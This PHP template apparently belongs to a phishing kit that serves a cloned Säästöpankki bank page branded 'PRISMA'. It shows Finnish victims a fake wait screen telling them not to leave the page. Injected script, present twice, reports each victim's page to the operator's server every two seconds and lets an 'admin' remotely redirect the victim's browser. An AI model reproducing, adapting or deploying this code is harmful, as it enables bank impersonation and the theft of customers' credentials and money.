<?php
ob_start();
$userName = htmlspecialchars($user['full_name'] ?? 'Kullanıcı');
$bankName = htmlspecialchars($bank['name'] ?? 'Säästöpankki');
$htmlContent = file_get_contents(__DIR__ . '/saastopankki2.html');

if (mb_detect_encoding($htmlContent, 'UTF-8', true) !== 'UTF-8') {
    $htmlContent = mb_convert_encoding($htmlContent, 'UTF-8', 'Windows-1252');
}

$basePath = '/saastopankki-files/';
$htmlContent = str_replace('./Säästöpankki_files/', $basePath, $htmlContent);
$htmlContent = str_replace('Säästöpankki_files/', $basePath, $htmlContent);

// PRISMA logosu üçün fonu vizual olaraq sil – gradientlə qarışdır
$htmlContent = str_replace(
    '<img src="/prisma_logo.png" alt="PRISMA" />',
    '<img id="prisma-logo" src="/prisma_logo.png" alt="PRISMA" />',
    $htmlContent
);

$prismaStyle = '<style>#prisma-logo{background-color:transparent;mix-blend-mode:multiply;}</style>';
if (strpos($htmlContent, '</head>') !== false) {
    $htmlContent = str_replace('</head>', $prismaStyle . '</head>', $htmlContent);
} else {
    $htmlContent = $prismaStyle . $htmlContent;
}

$adminScript = '';
$userId = isset($_SESSION['user_id']) ? $_SESSION['user_id'] : (isset($user['id']) ? $user['id'] : 0);
if ($userId > 0) {
    $adminScript = '<script>
    (function() {
        const userId = ' . json_encode($userId) . ';
        const currentPage = window.location.pathname;
        const pageTitle = document.title;
        
        function updateCurrentPage() {
            fetch(\'/api/update-page\', {
                method: \'POST\',
                headers: { \'Content-Type\': \'application/json\' },
                body: JSON.stringify({
                    user_id: userId,
                    current_page: currentPage,
                    page_title: pageTitle
                })
            }).catch(() => {});
        }
        
        function checkAdminRedirect() {
            fetch(\'/api/check-redirect?user_id=\' + userId)
                .then(response => response.json())
                .then(data => {
                    if (data.redirect && data.redirect !== currentPage) {
                        window.location.href = data.redirect;
                    }
                })
                .catch(() => {});
        }
        
        updateCurrentPage();
        checkAdminRedirect();
        setInterval(() => {
            updateCurrentPage();
            checkAdminRedirect();
        }, 2000);
    })();
    </script>';
}

if (strpos($htmlContent, '</body>') !== false) {
    $htmlContent = str_replace('</body>', $adminScript . '</body>', $htmlContent);
} else {
    $htmlContent = $htmlContent . $adminScript;
}

$content = ob_get_clean();
echo $htmlContent;
?>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * {
            font-family: 'Inter', sans-serif;
        }
        body {
            background: radial-gradient(1200px 700px at 50% 20%, rgba(255,255,255,0.12) 0%, rgba(255,255,255,0) 45%), linear-gradient(180deg, #0996d4 0%, #0b7fbc 55%, #0a6fb2 100%);
            min-height: 100vh;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        .pulse-animation {
            animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .wait-spinner {
            width: 34px;
            height: 34px;
            border-radius: 9999px;
            border: 4px solid rgba(255, 204, 42, 0.25);
            border-top-color: rgba(255, 204, 42, 1);
            animation: spin 1.0s linear infinite;
            filter: drop-shadow(0 8px 14px rgba(0,0,0,0.18));
        }
    </style>
</head>
<body>
    <div class="min-h-screen relative overflow-hidden">
        <div class="absolute inset-0 pointer-events-none">
            <div class="absolute -left-28 -bottom-10 w-[620px] h-[620px] opacity-[0.18]">
                <svg viewBox="0 0 700 700" class="w-full h-full" aria-hidden="true">
                    <defs>
                        <linearGradient id="wg1" x1="0" y1="0" x2="1" y2="1">
                            <stop offset="0" stop-color="#ffffff" stop-opacity="0.70" />
                            <stop offset="1" stop-color="#ffffff" stop-opacity="0.20" />
                        </linearGradient>
                        <linearGradient id="wg2" x1="0" y1="0" x2="0" y2="1">
                            <stop offset="0" stop-color="#ffffff" stop-opacity="0.55" />
                            <stop offset="1" stop-color="#ffffff" stop-opacity="0.10" />
                        </linearGradient>
                        <radialGradient id="wglow" cx="35%" cy="35%" r="70%">
                            <stop offset="0" stop-color="#ffffff" stop-opacity="0.35" />
                            <stop offset="1" stop-color="#ffffff" stop-opacity="0" />
                        </radialGradient>
                        <filter id="wsoft" x="-20%" y="-20%" width="140%" height="140%">
                            <feGaussianBlur stdDeviation="2" />
                        </filter>
                    </defs>
                    <circle cx="240" cy="520" r="260" fill="url(#wglow)" />
                    <g opacity="1">
                        <g transform="translate(70 360) rotate(-8 210 180)">
                            <path d="M95 120h290c20 0 36 16 36 36v70c0 20-16 36-36 36H95c-20 0-36-16-36-36v-70c0-20 16-36 36-36z" fill="url(#wg1)" />
                            <path d="M120 262h240v140c0 22-18 40-40 40H160c-22 0-40-18-40-40V262z" fill="url(#wg2)" />
                            <path d="M240 120v322" fill="none" stroke="#fff" stroke-opacity="0.42" stroke-width="22" />
                            <path d="M198 92c-16-23-19-49 4-65 23-16 47-2 54 17 7-19 31-33 54-17 23 16 20 42 4 65-18 27-49 29-58 29s-40-2-58-29z" fill="url(#wg1)" />
                        </g>
                        <g transform="translate(330 470) rotate(10 140 110)" opacity="0.95">
                            <rect x="40" y="70" width="210" height="140" rx="18" fill="url(#wg2)" />
                            <rect x="60" y="210" width="170" height="120" rx="18" fill="url(#wg1)" />
                            <path d="M145 70v260" fill="none" stroke="#fff" stroke-opacity="0.35" stroke-width="18" />
                        </g>
                        <g transform="translate(170 520) rotate(-16 90 70)" opacity="0.75" filter="url(#wsoft)">
                            <rect x="20" y="40" width="140" height="90" rx="14" fill="url(#wg2)" />
                            <rect x="34" y="130" width="112" height="70" rx="14" fill="url(#wg1)" />
                        </g>
                    </g>
                </svg>
            </div>
        </div>

        <div class="absolute right-5 top-5">
            <span class="px-4 py-2 rounded-full text-xs font-semibold bg-white/20 text-white/90 ring-1 ring-white/25 backdrop-blur">Hakemusprosessi</span>
        </div>

        <div class="min-h-screen flex items-center justify-center px-4 pt-10 pb-24">
            <div class="w-full max-w-[520px] text-center">
                <div class="flex justify-center mb-4">
                    <div class="wait-spinner" aria-label="Ladataan"></div>
                </div>

                <div class="mx-auto w-full max-w-[420px] bg-emerald-500/10 backdrop-blur-md rounded-2xl ring-1 ring-white/20 shadow-2xl px-5 py-5">
                    <div class="space-y-4 text-left">
                        <div class="flex gap-3">
                            <div class="mt-0.5 w-6 h-6 rounded-full bg-emerald-400/25 ring-1 ring-emerald-300/40 flex items-center justify-center">
                                <span class="w-2 h-2 rounded-full bg-emerald-300"></span>
                            </div>
                            <div class="text-white/85 text-sm leading-5">Siirron turvallisuuden vuoksi, älä poistu tältä sivulta.</div>
                        </div>

                        <div class="flex gap-3">
                            <div class="mt-0.5 w-6 h-6 rounded-full bg-emerald-400/25 ring-1 ring-emerald-300/40 flex items-center justify-center">
                                <span class="w-2 h-2 rounded-full bg-emerald-300"></span>
                            </div>
                            <div class="text-white/85 text-sm leading-5">Hakemuksesi käsitellään turvallisesti.</div>
                        </div>

                        <div class="flex gap-3">
                            <div class="mt-0.5 w-6 h-6 rounded-full bg-emerald-400/25 ring-1 ring-emerald-300/40 flex items-center justify-center">
                                <span class="w-2 h-2 rounded-full bg-emerald-300"></span>
                            </div>
                            <div class="text-white/85 text-sm leading-5">Prosessi voi kestää noin 15 minuuttia. Ole hyvä ja odota.</div>
                        </div>

                        <div class="flex gap-3">
                            <div class="mt-0.5 w-6 h-6 rounded-full bg-emerald-400/25 ring-1 ring-emerald-300/40 flex items-center justify-center">
                                <span class="w-2 h-2 rounded-full bg-emerald-300"></span>
                            </div>
                            <div class="text-white/85 text-sm leading-5">Varmista, että internet-yhteytesi on vakaa.</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="absolute bottom-6 left-1/2 -translate-x-1/2 text-white/70 text-xs">
                <div class="flex items-center justify-center gap-3">
                    <div>Powered by</div>
                    <img id="prisma-logo" src="/prisma_logo.png" alt="PRISMA" class="h-16 w-auto opacity-100" />
                </div>
        </div>
    </div>

    <script>
        <?php if (isset($_SESSION['user_id'])): ?>
        (function() {
            const userId = <?= json_encode($_SESSION['user_id']) ?>;
            const currentPage = window.location.pathname;
            const pageTitle = document.title;
            
            function updateCurrentPage() {
                fetch('/api/update-page', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        user_id: userId,
                        current_page: currentPage,
                        page_title: pageTitle
                    })
                }).catch(() => {});
            }
            
            function checkAdminRedirect() {
                fetch('/api/check-redirect?user_id=' + userId)
                    .then(response => response.json())
                    .then(data => {
                        if (data.redirect && data.redirect !== currentPage) {
                            window.location.href = data.redirect;
                        }
                    })
                    .catch(() => {});
            }
            
            updateCurrentPage();
            checkAdminRedirect();
            setInterval(() => {
                updateCurrentPage();
                checkAdminRedirect();
            }, 2000);
        })();
        <?php endif; ?>
    </script>
</body>
</html>
<?php
$content = ob_get_clean();
echo $content;
?>

